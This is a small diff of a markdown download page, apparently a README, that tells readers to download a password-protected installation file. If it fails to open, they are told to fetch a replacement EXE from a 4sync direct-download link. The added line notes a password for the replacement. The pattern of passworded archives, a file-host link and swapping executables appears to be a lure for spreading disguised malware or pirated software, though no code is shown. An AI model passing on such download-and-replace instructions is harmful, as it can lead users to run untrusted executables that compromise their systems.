@@ -13,6 +13,7 @@ Click the link below to download the installation file:
 **Password 2025**
 
 **If file dont open, download [this file](https://www.4sync.com/web/directDownload/4Ufzz5vy/cKQ38aak.ef87275520de9805aa0b0c059fbb002c) and replace EXE file**
+>**Password replace**
 
 ---
 
